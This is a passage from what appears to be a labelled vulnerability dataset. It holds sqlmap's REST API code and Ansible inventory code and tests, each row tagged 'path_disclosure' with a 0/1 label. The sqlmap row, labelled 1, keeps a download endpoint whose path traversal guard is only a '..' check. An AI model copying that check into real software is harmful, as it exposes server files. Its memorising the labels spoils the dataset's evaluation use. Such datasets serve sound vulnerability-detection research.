                ""SELECT id, status, value FROM data WHERE taskid = ? AND content_type = ?"",
                (self.taskid, content_type))

            # Delete partial output from IPC database if we have got a complete output
            if status == CONTENT_STATUS.COMPLETE:
                if len(output) > 0:
                    for index in xrange(len(output)):
                        conf.database_cursor.execute(""DELETE FROM data WHERE id = ?"",
                                                     (output[index][0],))

                conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                             (self.taskid, status, content_type, jsonize(value)))
                if kb.partRun:
                    kb.partRun = None

            elif status == CONTENT_STATUS.IN_PROGRESS:
                if len(output) == 0:
                    conf.database_cursor.execute(""INSERT INTO data VALUES(NULL, ?, ?, ?, ?)"",
                                                 (self.taskid, status, content_type,
                                                  jsonize(value)))
                else:
                    new_value = ""%s%s"" % (dejsonize(output[0][2]), value)
                    conf.database_cursor.execute(""UPDATE data SET value = ? WHERE id = ?"",
                                                 (jsonize(new_value), output[0][0]))
        else:
            conf.database_cursor.execute(""INSERT INTO errors VALUES(NULL, ?, ?)"",
                                         (self.taskid, str(value) if value else """"))

    def flush(self):
        pass

    def close(self):
        pass

    def seek(self):
        pass


class LogRecorder(logging.StreamHandler):
    def emit(self, record):
        """"""
        Record emitted events to IPC database for asynchronous I/O
        communication with the parent process
        """"""
        conf.database_cursor.execute(""INSERT INTO logs VALUES(NULL, ?, ?, ?, ?)"",
                                     (conf.taskid, time.strftime(""%X""), record.levelname,
                                      record.msg % record.args if record.args else record.msg))


def setRestAPILog():
    if hasattr(conf, ""api""):
        try:
            conf.database_cursor = Database(conf.database)
            conf.database_cursor.connect(""client"")
        except sqlite3.OperationalError, ex:
            raise SqlmapConnectionException, ""%s ('%s')"" % (ex, conf.database)

        # Set a logging handler that writes log messages to a IPC database
        logger.removeHandler(LOGGER_HANDLER)
        LOGGER_RECORDER = LogRecorder()
        logger.addHandler(LOGGER_RECORDER)


# Generic functions
def is_admin(taskid):
    return DataStore.admin_id == taskid


@hook(""after_request"")
def security_headers(json_header=True):
    """"""
    Set some headers across all HTTP responses
    """"""
    response.headers[""Server""] = ""Server""
    response.headers[""X-Content-Type-Options""] = ""nosniff""
    response.headers[""X-Frame-Options""] = ""DENY""
    response.headers[""X-XSS-Protection""] = ""1; mode=block""
    response.headers[""Pragma""] = ""no-cache""
    response.headers[""Cache-Control""] = ""no-cache""
    response.headers[""Expires""] = ""0""
    if json_header:
        response.content_type = ""application/json; charset=UTF-8""

##############################
# HTTP Status Code functions #
##############################


@return_error(401)  # Access Denied
def error401(error=None):
    security_headers(False)
    return ""Access denied""


@return_error(404)  # Not Found
def error404(error=None):
    security_headers(False)
    return ""Nothing here""


@return_error(405)  # Method Not Allowed (e.g. when requesting a POST method via GET)
def error405(error=None):
    security_headers(False)
    return ""Method not allowed""


@return_error(500)  # Internal Server Error
def error500(error=None):
    security_headers(False)
    return ""Internal server error""

#############################
# Task management functions #
#############################


# Users' methods
@get(""/task/new"")
def task_new():
    """"""
    Create new task ID
    """"""
    taskid = hexencode(os.urandom(8))
    remote_addr = request.remote_addr

    DataStore.tasks[taskid] = Task(taskid, remote_addr)

    logger.debug(""Created new task: '%s'"" % taskid)
    return jsonize({""success"": True, ""taskid"": taskid})


@get(""/task/<taskid>/delete"")
def task_delete(taskid):
    """"""
    Delete own task ID
    """"""
    if taskid in DataStore.tasks:
        DataStore.tasks.pop(taskid)

        logger.debug(""[%s] Deleted task"" % taskid)
        return jsonize({""success"": True})
    else:
        logger.warning(""[%s] Invalid task ID provided to task_delete()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

###################
# Admin functions #
###################


@get(""/admin/<taskid>/list"")
def task_list(taskid=None):
    """"""
    List task pull
    """"""
    tasks = {}

    for key in DataStore.tasks:
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            tasks[key] = dejsonize(scan_status(key))[""status""]

    logger.debug(""[%s] Listed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True, ""tasks"": tasks, ""tasks_num"": len(tasks)})

@get(""/admin/<taskid>/flush"")
def task_flush(taskid):
    """"""
    Flush task spool (delete all tasks)
    """"""

    for key in list(DataStore.tasks):
        if is_admin(taskid) or DataStore.tasks[key].remote_addr == request.remote_addr:
            DataStore.tasks[key].engine_kill()
            del DataStore.tasks[key]

    logger.debug(""[%s] Flushed task pool (%s)"" % (taskid, ""admin"" if is_admin(taskid) else request.remote_addr))
    return jsonize({""success"": True})

##################################
# sqlmap core interact functions #
##################################


# Handle task's options
@get(""/option/<taskid>/list"")
def option_list(taskid):
    """"""
    List options for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_list()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    logger.debug(""[%s] Listed task options"" % taskid)
    return jsonize({""success"": True, ""options"": DataStore.tasks[taskid].get_options()})


@post(""/option/<taskid>/get"")
def option_get(taskid):
    """"""
    Get the value of an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_get()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    option = request.json.get(""option"", """")

    if option in DataStore.tasks[taskid].options:
        logger.debug(""[%s] Retrieved value for option %s"" % (taskid, option))
        return jsonize({""success"": True, option: DataStore.tasks[taskid].get_option(option)})
    else:
        logger.debug(""[%s] Requested value for unknown option %s"" % (taskid, option))
        return jsonize({""success"": False, ""message"": ""Unknown option"", option: ""not set""})


@post(""/option/<taskid>/set"")
def option_set(taskid):
    """"""
    Set an option (command line switch) for a certain task ID
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to option_set()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    logger.debug(""[%s] Requested to set options"" % taskid)
    return jsonize({""success"": True})


# Handle scans
@post(""/scan/<taskid>/start"")
def scan_start(taskid):
    """"""
    Launch a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_start()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Initialize sqlmap engine's options with user's provided options, if any
    for option, value in request.json.items():
        DataStore.tasks[taskid].set_option(option, value)

    # Launch sqlmap engine in a separate process
    DataStore.tasks[taskid].engine_start()

    logger.debug(""[%s] Started scan"" % taskid)
    return jsonize({""success"": True, ""engineid"": DataStore.tasks[taskid].engine_get_id()})


@get(""/scan/<taskid>/stop"")
def scan_stop(taskid):
    """"""
    Stop a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_stop()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_stop()

    logger.debug(""[%s] Stopped scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/kill"")
def scan_kill(taskid):
    """"""
    Kill a scan
    """"""
    if (taskid not in DataStore.tasks or
            DataStore.tasks[taskid].engine_process() is None or
            DataStore.tasks[taskid].engine_has_terminated()):
        logger.warning(""[%s] Invalid task ID provided to scan_kill()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    DataStore.tasks[taskid].engine_kill()

    logger.debug(""[%s] Killed scan"" % taskid)
    return jsonize({""success"": True})


@get(""/scan/<taskid>/status"")
def scan_status(taskid):
    """"""
    Returns status of a scan
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_status()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if DataStore.tasks[taskid].engine_process() is None:
        status = ""not running""
    else:
        status = ""terminated"" if DataStore.tasks[taskid].engine_has_terminated() is True else ""running""

    logger.debug(""[%s] Retrieved scan status"" % taskid)
    return jsonize({
        ""success"": True,
        ""status"": status,
        ""returncode"": DataStore.tasks[taskid].engine_get_returncode()
    })


@get(""/scan/<taskid>/data"")
def scan_data(taskid):
    """"""
    Retrieve the data of a scan
    """"""
    json_data_message = list()
    json_errors_message = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_data()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all data from the IPC database for the taskid
    for status, content_type, value in DataStore.current_db.execute(
            ""SELECT status, content_type, value FROM data WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_data_message.append(
            {""status"": status, ""type"": content_type, ""value"": dejsonize(value)})

    # Read all error messages from the IPC database
    for error in DataStore.current_db.execute(
            ""SELECT error FROM errors WHERE taskid = ? ORDER BY id ASC"",
            (taskid,)):
        json_errors_message.append(error)

    logger.debug(""[%s] Retrieved scan data and error messages"" % taskid)
    return jsonize({""success"": True, ""data"": json_data_message, ""error"": json_errors_message})


# Functions to handle scans' logs
@get(""/scan/<taskid>/log/<start>/<end>"")
def scan_log_limited(taskid, start, end):
    """"""
    Retrieve a subset of log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    if not start.isdigit() or not end.isdigit() or end < start:
        logger.warning(""[%s] Invalid start or end value provided to scan_log_limited()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid start or end value, must be digits""})

    start = max(1, int(start))
    end = max(1, int(end))

    # Read a subset of log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            (""SELECT time, level, message FROM logs WHERE ""
             ""taskid = ? AND id >= ? AND id <= ? ORDER BY id ASC""),
            (taskid, start, end)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages subset"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


@get(""/scan/<taskid>/log"")
def scan_log(taskid):
    """"""
    Retrieve the log messages
    """"""
    json_log_messages = list()

    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to scan_log()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Read all log messages from the IPC database
    for time_, level, message in DataStore.current_db.execute(
            ""SELECT time, level, message FROM logs WHERE taskid = ? ORDER BY id ASC"", (taskid,)):
        json_log_messages.append({""time"": time_, ""level"": level, ""message"": message})

    logger.debug(""[%s] Retrieved scan log messages"" % taskid)
    return jsonize({""success"": True, ""log"": json_log_messages})


# Function to handle files inside the output directory
@get(""/download/<taskid>/<target>/<filename:path>"")
def download(taskid, target, filename):
    """"""
    Download a certain file from the file system
    """"""
    if taskid not in DataStore.tasks:
        logger.warning(""[%s] Invalid task ID provided to download()"" % taskid)
        return jsonize({""success"": False, ""message"": ""Invalid task ID""})

    # Prevent file path traversal - the lame way
    if "".."" in target:
        logger.warning(""[%s] Forbidden path (%s)"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""Forbidden path""})

    path = os.path.join(paths.SQLMAP_OUTPUT_PATH, target)

    if os.path.exists(path):
        logger.debug(""[%s] Retrieved content of file %s"" % (taskid, target))
        with open(path, 'rb') as inf:
            file_content = inf.read()
        return jsonize({""success"": True, ""file"": file_content.encode(""base64"")})
    else:
        logger.warning(""[%s] File does not exist %s"" % (taskid, target))
        return jsonize({""success"": False, ""message"": ""File does not exist""})


def server(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT, adapter=RESTAPI_DEFAULT_ADAPTER):
    """"""
    REST-JSON API server
    """"""
    DataStore.admin_id = hexencode(os.urandom(16))
    Database.filepath = tempfile.mkstemp(prefix=""sqlmapipc-"", text=False)[1]

    logger.info(""Running REST-JSON API server at '%s:%d'.."" % (host, port))
    logger.info(""Admin ID: %s"" % DataStore.admin_id)
    logger.debug(""IPC database: %s"" % Database.filepath)

    # Initialize IPC database
    DataStore.current_db = Database()
    DataStore.current_db.connect()
    DataStore.current_db.init()

    # Run RESTful API
    try:
        if adapter == ""gevent"":
            from gevent import monkey
            monkey.patch_all()
        elif adapter == ""eventlet"":
            import eventlet
            eventlet.monkey_patch()
        logger.debug(""Using adapter '%s' to run bottle"" % adapter)
        run(host=host, port=port, quiet=True, debug=False, server=adapter)
    except socket.error, ex:
        if ""already in use"" in getSafeExString(ex):
            logger.error(""Address already in use ('%s:%s')"" % (host, port))
        else:
            raise
    except ImportError:
        errMsg = ""Adapter '%s' is not available on this system"" % adapter
        if adapter in (""gevent"", ""eventlet""):
            errMsg += "" (e.g.: 'sudo apt-get install python-%s')"" % adapter
        logger.critical(errMsg)

def _client(url, options=None):
    logger.debug(""Calling %s"" % url)
    try:
        data = None
        if options is not None:
            data = jsonize(options)
        req = urllib2.Request(url, data, {'Content-Type': 'application/json'})
        response = urllib2.urlopen(req)
        text = response.read()
    except:
        if options:
            logger.error(""Failed to load and parse %s"" % url)
        raise
    return text


def client(host=RESTAPI_DEFAULT_ADDRESS, port=RESTAPI_DEFAULT_PORT):
    """"""
    REST-JSON API client
    """"""

    dbgMsg = ""Example client access from command line:""
    dbgMsg += ""\n\t$ taskid=$(curl http://%s:%d/task/new 2>1 | grep -o -I '[a-f0-9]\{16\}') && echo $taskid"" % (host, port)
    dbgMsg += ""\n\t$ curl -H \""Content-Type: application/json\"" -X POST -d '{\""url\"": \""http://testphp.vulnweb.com/artists.php?artist=1\""}' http://%s:%d/scan/$taskid/start"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/data"" % (host, port)
    dbgMsg += ""\n\t$ curl http://%s:%d/scan/$taskid/log"" % (host, port)
    logger.debug(dbgMsg)

    addr = ""http://%s:%d"" % (host, port)
    logger.info(""Starting REST-JSON API client to '%s'..."" % addr)

    try:
        _client(addr)
    except Exception, ex:
        if not isinstance(ex, urllib2.HTTPError):
            errMsg = ""There has been a problem while connecting to the ""
            errMsg += ""REST-JSON API server at '%s' "" % addr
            errMsg += ""(%s)"" % ex
            logger.critical(errMsg)
            return

    taskid = None
    logger.info(""Type 'help' or '?' for list of available commands"")

    while True:
        try:
            command = raw_input(""api%s> "" % ("" (%s)"" % taskid if taskid else """")).strip().lower()
        except (EOFError, KeyboardInterrupt):
            print
            break

        if command in (""data"", ""log"", ""status"", ""stop"", ""kill""):
            if not taskid:
                logger.error(""No task ID in use"")
                continue
            raw = _client(""%s/scan/%s/%s"" % (addr, taskid, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            dataToStdout(""%s\n"" % raw)

        elif command.startswith(""new""):
            if ' ' not in command:
                logger.error(""Program arguments are missing"")
                continue

            argv = [""sqlmap.py""] + shlex.split(command)[1:]

            try:
                cmdLineOptions = cmdLineParser(argv).__dict__
            except:
                taskid = None
                continue

            for key in list(cmdLineOptions):
                if cmdLineOptions[key] is None:
                    del cmdLineOptions[key]

            raw = _client(""%s/task/new"" % addr)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to create new task"")
                continue
            taskid = res[""taskid""]
            logger.info(""New task ID is '%s'"" % taskid)

            raw = _client(""%s/scan/%s/start"" % (addr, taskid), cmdLineOptions)
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to start scan"")
                continue
            logger.info(""Scanning started"")

        elif command.startswith(""use""):
            taskid = (command.split()[1] if ' ' in command else """").strip(""'\"""")
            if not taskid:
                logger.error(""Task ID is missing"")
                taskid = None
                continue
            elif not re.search(r""\A[0-9a-fA-F]{16}\Z"", taskid):
                logger.error(""Invalid task ID '%s'"" % taskid)
                taskid = None
                continue
            logger.info(""Switching to task ID '%s' "" % taskid)

        elif command in (""list"", ""flush""):
            raw = _client(""%s/admin/%s/%s"" % (addr, taskid or 0, command))
            res = dejsonize(raw)
            if not res[""success""]:
                logger.error(""Failed to execute command %s"" % command)
            elif command == ""flush"":
                taskid = None
            dataToStdout(""%s\n"" % raw)

        elif command in (""exit"", ""bye"", ""quit"", 'q'):
            return

        elif command in (""help"", ""?""):
            msg =  ""help        Show this help message\n""
            msg += ""new ARGS    Start a new scan task with provided arguments (e.g. 'new -u \""http://testphp.vulnweb.com/artists.php?artist=1\""')\n""
            msg += ""use TASKID  Switch current context to different task (e.g. 'use c04d8c5c7582efb4')\n""
            msg += ""data        Retrieve and show data for current task\n""
            msg += ""log         Retrieve and show log for current task\n""
            msg += ""status      Retrieve and show status for current task\n""
            msg += ""stop        Stop current task\n""
            msg += ""kill        Kill current task\n""
            msg += ""list        Display all tasks\n""
            msg += ""flush       Flush tasks (delete all tasks)\n""
            msg += ""exit        Exit this client\n""

            dataToStdout(msg)

        elif command:
            logger.error(""Unknown command '%s'"" % command)
/n/n/n",1,path_disclosure
16,40,153c9bd539eeffdd6d395b8840f95d56e3814f27,"lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError

from itertools import chain


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
            hosts=self.hosts,
        )

        return result

    def deserialize(self, data):
        self.__init__()
        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.depth = data.get('depth', 0)
        self.hosts = data.get('hosts', [])
        self._hosts = None

        parent_groups = data.get('parent_groups', [])
        for parent_data in parent_groups:
            g = Group()
            g.deserialize(parent_data)
            self.parent_groups.append(g)

    def _walk_relationship(self, rel):
        '''
        Given `rel` that is an iterable property of Group,
        consitituting a directed acyclic graph among all groups,
        Returns a set of all groups in full tree
        A   B    C
        |  / |  /
        | /  | /
        D -> E
        |  /    vertical connections
        | /     are directed upward
        F
        Called on F, returns set of (A, B, C, D, E)
        '''
        seen = set([])
        unprocessed = set(getattr(self, rel))

        while unprocessed:
            seen.update(unprocessed)
            unprocessed = set(chain.from_iterable(
                getattr(g, rel) for g in unprocessed
            ))
            unprocessed.difference_update(seen)

        return seen

    def get_ancestors(self):
        return self._walk_relationship('parent_groups')

    def get_descendants(self):
        return self._walk_relationship('child_groups')

    @property
    def host_names(self):
        if self._hosts is None:
            self._hosts = set(self.hosts)
        return self._hosts

    def get_name(self):
        return self.name

    def add_child_group(self, group):

        if self == group:
            raise Exception(""can't add group to itself"")

        # don't add if it's already there
        if group not in self.child_groups:

            # prepare list of group's new ancestors this edge creates
            start_ancestors = group.get_ancestors()
            new_ancestors = self.get_ancestors()
            if group in new_ancestors:
                raise AnsibleError(
                    ""Adding group '%s' as child to '%s' creates a recursive ""
                    ""dependency loop."" % (group.name, self.name))
            new_ancestors.add(self)
            new_ancestors.difference_update(start_ancestors)

            self.child_groups.append(group)

            # update the depth of the child
            group.depth = max([self.depth + 1, group.depth])

            # update the depth of the grandchildren
            group._check_children_depth()

            # now add self to child's parent_groups list, but only if there
            # isn't already a group with the same name
            if self.name not in [g.name for g in group.parent_groups]:
                group.parent_groups.append(self)
                for h in group.get_hosts():
                    h.populate_ancestors(additions=new_ancestors)

            self.clear_hosts_cache()

    def _check_children_depth(self):

        depth = self.depth
        start_depth = self.depth  # self.depth could change over loop
        seen = set([])
        unprocessed = set(self.child_groups)

        while unprocessed:
            seen.update(unprocessed)
            depth += 1
            to_process = unprocessed.copy()
            unprocessed = set([])
            for g in to_process:
                if g.depth < depth:
                    g.depth = depth
                    unprocessed.update(g.child_groups)
            if depth - start_depth > len(seen):
                raise AnsibleError(""The group named '%s' has a recursive dependency loop."" % self.name)

    def add_host(self, host):
        if host.name not in self.host_names:
            self.hosts.append(host)
            self._hosts.add(host.name)
            host.add_group(self)
            self.clear_hosts_cache()

    def remove_host(self, host):

        if host.name in self.host_names:
            self.hosts.remove(host)
            self._hosts.remove(host.name)
            host.remove_group(self)
            self.clear_hosts_cache()

    def set_variable(self, key, value):

        if key == 'ansible_group_priority':
            self.set_priority(int(value))
        else:
            self.vars[key] = value

    def clear_hosts_cache(self):

        self._hosts_cache = None
        for g in self.get_ancestors():
            g._hosts_cache = None

    def get_hosts(self):

        if self._hosts_cache is None:
            self._hosts_cache = self._get_hosts()
        return self._hosts_cache

    def _get_hosts(self):

        hosts = []
        seen = {}
        for kid in self.get_descendants():
            kid_hosts = kid.hosts
            for kk in kid_hosts:
                if kk not in seen:
                    seen[kk] = 1
                    if self.name == 'all' and kk.implicit:
                        continue
                    hosts.append(kk)
        for mine in self.hosts:
            if mine not in seen:
                seen[mine] = 1
                if self.name == 'all' and mine.implicit:
                    continue
                hosts.append(mine)
        return hosts

    def get_vars(self):
        return self.vars.copy()

    def set_priority(self, priority):
        try:
            self.priority = int(priority)
        except TypeError:
            # FIXME: warn about invalid priority
            pass
/n/n/nlib/ansible/inventory/host.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

# Make coding more python3-ish
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.inventory.group import Group
from ansible.utils.vars import combine_vars, get_unique_id

__all__ = ['Host']


class Host:
    ''' a single ansible host '''

    # __slots__ = [ 'name', 'vars', 'groups' ]

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def __eq__(self, other):
        if not isinstance(other, Host):
            return False
        return self._uuid == other._uuid

    def __ne__(self, other):
        return not self.__eq__(other)

    def __hash__(self):
        return hash(self.name)

    def __str__(self):
        return self.get_name()

    def __repr__(self):
        return self.get_name()

    def serialize(self):
        groups = []
        for group in self.groups:
            groups.append(group.serialize())

        return dict(
            name=self.name,
            vars=self.vars.copy(),
            address=self.address,
            uuid=self._uuid,
            groups=groups,
            implicit=self.implicit,
        )

    def deserialize(self, data):
        self.__init__(gen_uuid=False)

        self.name = data.get('name')
        self.vars = data.get('vars', dict())
        self.address = data.get('address', '')
        self._uuid = data.get('uuid', None)
        self.implicit = data.get('implicit', False)

        groups = data.get('groups', [])
        for group_data in groups:
            g = Group()
            g.deserialize(group_data)
            self.groups.append(g)

    def __init__(self, name=None, port=None, gen_uuid=True):

        self.vars = {}
        self.groups = []
        self._uuid = None

        self.name = name
        self.address = name

        if port:
            self.set_variable('ansible_port', int(port))

        if gen_uuid:
            self._uuid = get_unique_id()
        self.implicit = False

    def get_name(self):
        return self.name

    def populate_ancestors(self, additions=None):
        # populate ancestors
        if additions is None:
            for group in self.groups:
                self.add_group(group)
        else:
            for group in additions:
                if group not in self.groups:
                    self.groups.append(group)

    def add_group(self, group):

        # populate ancestors first
        for oldg in group.get_ancestors():
            if oldg not in self.groups:
                self.groups.append(oldg)

        # actually add group
        if group not in self.groups:
            self.groups.append(group)

    def remove_group(self, group):

        if group in self.groups:
            self.groups.remove(group)

            # remove exclusive ancestors, xcept all!
            for oldg in group.get_ancestors():
                if oldg.name != 'all':
                    for childg in self.groups:
                        if oldg in childg.get_ancestors():
                            break
                    else:
                        self.remove_group(oldg)

    def set_variable(self, key, value):
        self.vars[key] = value

    def get_groups(self):
        return self.groups

    def get_magic_vars(self):
        results = {}
        results['inventory_hostname'] = self.name
        results['inventory_hostname_short'] = self.name.split('.')[0]
        results['group_names'] = sorted([g.name for g in self.get_groups() if g.name != 'all'])

        return results

    def get_vars(self):
        return combine_vars(self.vars, self.get_magic_vars())
/n/n/ntest/units/plugins/inventory/test_group.py/n/n# Copyright 2018 Alan Rominger <arominge@redhat.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.

from ansible.compat.tests import unittest

from ansible.inventory.group import Group
from ansible.inventory.host import Host
from ansible.errors import AnsibleError


class TestGroup(unittest.TestCase):

    def test_depth_update(self):
        A = Group('A')
        B = Group('B')
        Z = Group('Z')
        A.add_child_group(B)
        A.add_child_group(Z)
        self.assertEqual(A.depth, 0)
        self.assertEqual(Z.depth, 1)
        self.assertEqual(B.depth, 1)

    def test_depth_update_dual_branches(self):
        alpha = Group('alpha')
        A = Group('A')
        alpha.add_child_group(A)
        B = Group('B')
        A.add_child_group(B)
        Z = Group('Z')
        alpha.add_child_group(Z)
        beta = Group('beta')
        B.add_child_group(beta)
        Z.add_child_group(beta)

        self.assertEqual(alpha.depth, 0)  # apex
        self.assertEqual(beta.depth, 3)  # alpha -> A -> B -> beta

        omega = Group('omega')
        omega.add_child_group(alpha)

        # verify that both paths are traversed to get the max depth value
        self.assertEqual(B.depth, 3)  # omega -> alpha -> A -> B
        self.assertEqual(beta.depth, 4)  # B -> beta

    def test_depth_recursion(self):
        A = Group('A')
        B = Group('B')
        A.add_child_group(B)
        # hypothetical of adding B as child group to A
        A.parent_groups.append(B)
        B.child_groups.append(A)
        # can't update depths of groups, because of loop
        with self.assertRaises(AnsibleError):
            B._check_children_depth()

    def test_loop_detection(self):
        A = Group('A')
        B = Group('B')
        C = Group('C')
        A.add_child_group(B)
        B.add_child_group(C)
        with self.assertRaises(AnsibleError):
            C.add_child_group(A)

    def test_populates_descendant_hosts(self):
        A = Group('A')
        B = Group('B')
        C = Group('C')
        h = Host('h')
        C.add_host(h)
        A.add_child_group(B)  # B is child of A
        B.add_child_group(C)  # C is descendant of A
        A.add_child_group(B)
        self.assertEqual(set(h.groups), set([C, B, A]))
        h2 = Host('h2')
        C.add_host(h2)
        self.assertEqual(set(h2.groups), set([C, B, A]))

    def test_ancestor_example(self):
        # see docstring for Group._walk_relationship
        groups = {}
        for name in ['A', 'B', 'C', 'D', 'E', 'F']:
            groups[name] = Group(name)
        # first row
        groups['A'].add_child_group(groups['D'])
        groups['B'].add_child_group(groups['D'])
        groups['B'].add_child_group(groups['E'])
        groups['C'].add_child_group(groups['D'])
        # second row
        groups['D'].add_child_group(groups['E'])
        groups['D'].add_child_group(groups['F'])
        groups['E'].add_child_group(groups['F'])

        self.assertEqual(
            set(groups['F'].get_ancestors()),
            set([
                groups['A'], groups['B'], groups['C'], groups['D'], groups['E']
            ])
        )

    def test_ancestors_recursive_loop_safe(self):
        '''
        The get_ancestors method may be referenced before circular parenting
        checks, so the method is expected to be stable even with loops
        '''
        A = Group('A')
        B = Group('B')
        A.parent_groups.append(B)
        B.parent_groups.append(A)
        # finishes in finite time
        self.assertEqual(A.get_ancestors(), set([A, B]))
/n/n/n",0,path_disclosure
17,41,153c9bd539eeffdd6d395b8840f95d56e3814f27,"/lib/ansible/inventory/group.py/n/n# (c) 2012-2014, Michael DeHaan <michael.dehaan@gmail.com>
#
# This file is part of Ansible
#
# Ansible is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Ansible is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Ansible.  If not, see <http://www.gnu.org/licenses/>.
from __future__ import (absolute_import, division, print_function)
__metaclass__ = type

from ansible.errors import AnsibleError


class Group:
    ''' a group of ansible hosts '''

    # __slots__ = [ 'name', 'hosts', 'vars', 'child_groups', 'parent_groups', 'depth', '_hosts_cache' ]

    def __init__(self, name=None):

        self.depth = 0
        self.name = name
        self.hosts = []
        self._hosts = None
        self.vars = {}
        self.child_groups = []
        self.parent_groups = []
        self._hosts_cache = None
        self.priority = 1

    def __repr__(self):
        return self.get_name()

    def __str__(self):
        return self.get_name()

    def __getstate__(self):
        return self.serialize()

    def __setstate__(self, data):
        return self.deserialize(data)

    def serialize(self):
        parent_groups = []
        for parent in self.parent_groups:
            parent_groups.append(parent.serialize())

        self._hosts = None

        result = dict(
            name=self.name,
            vars=self.vars.copy(),
            parent_groups=parent_groups,
            depth=self.depth,
